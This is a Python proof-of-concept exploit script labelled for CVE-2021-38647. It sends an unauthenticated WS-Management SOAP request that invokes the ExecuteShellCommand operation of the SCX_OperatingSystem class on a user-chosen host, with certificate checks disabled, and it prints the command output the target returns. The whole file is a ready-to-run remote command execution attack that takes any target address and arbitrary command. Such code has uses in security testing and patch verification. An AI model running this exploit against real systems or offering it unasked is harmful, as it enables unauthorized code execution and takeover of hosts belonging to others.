import re
import argparse
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
XML = """<s:Envelope
    xmlns:s="http://www.w3.org/2003/05/soap-envelope"
    xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"
    xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration"
    xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema"
    xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"
    xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"
>
  <s:Header>
    <a:To>HTTP://{}:{}/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:FE439F30-CC09-0005-0000-000000010000</a:MessageID>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
    <w:OptionSet s:mustUnderstand="true"/>
    <w:SelectorSet>
      <w:Selector Name="__cimnamespace">root/scx</w:Selector>
    </w:SelectorSet>
  </s:Header>
  <s:Body>
    <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:command>{}</p:command>
      <p:timeout>0</p:timeout>
    </p:ExecuteShellCommand_INPUT>
  </s:Body>
</s:Envelope>"""


def main():
    parser = argparse.ArgumentParser(description="PoC exploit for CVE-2021-38647")
    parser.add_argument("host", help="Target IP/URL")
    parser.add_argument("cmd", help="Command to run on the target")
    parser.add_argument("-p", "--port", type=int, default=5986, help="Target port")
    parser.add_argument("-s", "--https", action="store_true", help="Use HTTPS")
    args = parser.parse_args()

    host_prefix = ""
    if not args.host.startswith(("http://", "https://")):
        if args.https:
            host_prefix = "https://"
        else:
            host_prefix = "http://"


    try:
        res = requests.post(
            f"{host_prefix}{args.host}:{args.port}",
            data=XML.format(args.host, args.port, args.cmd),
            headers={
                "Content-Type": "application/soap+xml",
            },
            verify=False,
        )
    except Exception as e:
        print("Something went wrong. The target may be down or is not vulnerable.")
        print(e)
        exit(1)

    stdout = re.search(r"<p:StdOut>(.*?)</p:StdOut>", res.text)
    stderr = re.search(r"<p:StdErr>(.*?)</p:StdErr>", res.text)

    if not stdout and not stderr:
        print("The target doesn't appear to be vulnerable.")
        exit(1)

    if stdout:
        print(":: STDOUT ::")
        print(stdout.group(1))

    if stderr:
        print(":: STDERR ::")
        print(stderr.group(1))


if __name__ == "__main__":
    main()
